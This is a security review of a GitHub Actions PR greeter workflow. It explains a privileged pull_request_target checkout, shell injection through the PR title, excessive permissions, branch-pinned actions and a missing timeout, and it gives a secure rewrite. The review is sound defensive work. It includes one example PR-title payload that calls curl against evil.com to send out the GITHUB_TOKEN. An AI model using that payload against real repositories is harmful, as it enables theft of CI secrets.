# Security Review: PR Greeter Workflow

## Summary

This workflow contains **5 security vulnerabilities**, including 2 critical issues that together create a high-severity exploit chain. The combination of `pull_request_target` with a head-SHA checkout and script injection makes this workflow exploitable by any external contributor.

---

## Critical Issues

### 1. Dangerous `pull_request_target` + Head SHA Checkout (CRITICAL)

```yaml
on: pull_request_target
# ...
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
```

**Problem:** `pull_request_target` runs in the context of the base branch, which means it has access to repository secrets and write permissions. Checking out the PR head SHA then executes untrusted code from the fork in this privileged context. An attacker can submit a PR that modifies any file (e.g., a Makefile, script, or even a subsequent workflow step's referenced file) and have it run with full secret access and write permissions.

**Fix:** Use the `pull_request` trigger instead, which runs in the context of the fork and does not have access to base-branch secrets. If `pull_request_target` is truly required (e.g., to post a comment on a PR from a fork), never check out the PR's code. Use only the event metadata:

```yaml
on: pull_request_target

jobs:
  greet:
    runs-on: arc-runner-set
    timeout-minutes: 5
    steps:
      # Do NOT checkout PR code when using pull_request_target
      - uses: peter-evans/create-or-update-comment@71345be0265236311c031f5c7866368bd1eff043 # v4.0.0
        with:
          issue-number: ${{ github.event.pull_request.number }}
          body: "Welcome! Thanks for contributing."
```

### 2. Script Injection via PR Title (CRITICAL)

```yaml
- run: echo "Hello ${{ github.event.pull_request.title }}! Thanks for contributing."
```

**Problem:** The PR title is directly interpolated into a shell command. An attacker can set their PR title to a string like:

```
"; curl https://evil.com/exfil?token=$GITHUB_TOKEN; echo "
```

This injects arbitrary shell commands. Combined with the `pull_request_target` trigger and `write-all` permissions, the attacker can exfiltrate secrets, modify repository contents, or push malicious code.

**Fix:** Pass untrusted input via environment variables, which are not interpreted by the shell as code:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Hello $PR_TITLE! Thanks for contributing."
```

---

## High Severity Issues

### 3. Overly Permissive `permissions: write-all` (HIGH)

```yaml
permissions: write-all
```

**Problem:** This grants the workflow token every possible write permission (contents, packages, deployments, actions, security-events, etc.). A greeting workflow needs at most `pull-requests: write` to post a comment. The excessive permissions massively increase the blast radius of any exploit, including the injection vulnerabilities above.

**Fix:** Declare the minimum permissions required:

```yaml
permissions:
  pull-requests: write
```

---

## Medium Severity Issues

### 4. Third-Party Action Pinned to Mutable Branch (MEDIUM)

```yaml
- uses: some-org/post-comment@main
```

**Problem:** This action is pinned to the `main` branch, not a commit SHA. The action's maintainers (or an attacker who compromises their repo) can push arbitrary code to `main` at any time, and this workflow will immediately execute it. Since `actions/*` actions are protected by GitHub, branch/tag pinning is acceptable only for those. All other actions must be pinned to a full commit SHA.

**Fix:** Pin to a specific commit SHA with a version comment:

```yaml
- uses: some-org/post-comment@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0 # v2.1.0
```

Audit the action's source before adopting it. Verify it is actively maintained and does not request excessive permissions. Use Dependabot or Renovate to automate SHA updates.

### 5. Missing `timeout-minutes` on Job (MEDIUM)

```yaml
jobs:
  greet:
    runs-on: arc-runner-set
    steps: ...
```

**Problem:** No `timeout-minutes` is set. On self-hosted ARC runners, a hung or maliciously stalled job will consume a runner pod indefinitely, potentially exhausting runner capacity and blocking other workflows.

**Fix:** Always set a timeout. For a simple greeter, a short timeout is sufficient:

```yaml
jobs:
  greet:
    runs-on: arc-runner-set
    timeout-minutes: 5
```

---

## Additional Observations

- **`actions/checkout@v4` is pinned to a version tag, not a SHA.** For `actions/*` this is acceptable per GitHub's protection of their own action tags, but pinning to SHA is still the stronger practice: `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`.
- **The `user.login` interpolation in the comment body** (`"Welcome ${{ github.event.pull_request.user.login }}!"`) is used as an argument to an action input, not in a `run:` block, so it is not directly exploitable as shell injection. However, depending on how `some-org/post-comment` processes this value internally, it could still pose a risk. After switching to a trusted, SHA-pinned action, this becomes lower concern.

---

## Recommended Secure Rewrite

```yaml
name: PR Greeter
on:
  pull_request_target:
    types: [opened]

permissions:
  pull-requests: write

jobs:
  greet:
    runs-on: arc-runner-set
    timeout-minutes: 5
    steps:
      - uses: peter-evans/create-or-update-comment@71345be0265236311c031f5c7866368bd1eff043 # v4.0.0
        with:
          issue-number: ${{ github.event.pull_request.number }}
          body: "Welcome @${{ github.event.pull_request.user.login }}! Thanks for contributing."
```

Key changes in the rewrite:
1. No checkout of untrusted PR code.
2. Permissions scoped to only `pull-requests: write`.
3. No shell interpolation of user-controlled input.
4. Third-party action pinned to full commit SHA.
5. `timeout-minutes` set on the job.
6. Trigger scoped to `opened` PRs only (no need to greet on every synchronize event).

---

## Checklist Applied

| Check | Status | Notes |
|---|---|---|
| `timeout-minutes` set on every job | FAIL | No timeout set |
| `permissions` explicitly declared (least privilege) | FAIL | Uses `write-all` |
| Third-party actions pinned to SHA | FAIL | `some-org/post-comment@main` uses branch ref |
| `runs-on` uses correct self-hosted runner label | PASS | Uses `arc-runner-set` |
| Secrets not interpolated in `run:` blocks | FAIL | PR title injected directly into shell |
| PR-triggered workflows limited to necessary write perms | FAIL | `write-all` on `pull_request_target` |
| No untrusted code checkout with privileged trigger | FAIL | `pull_request_target` + head SHA checkout |
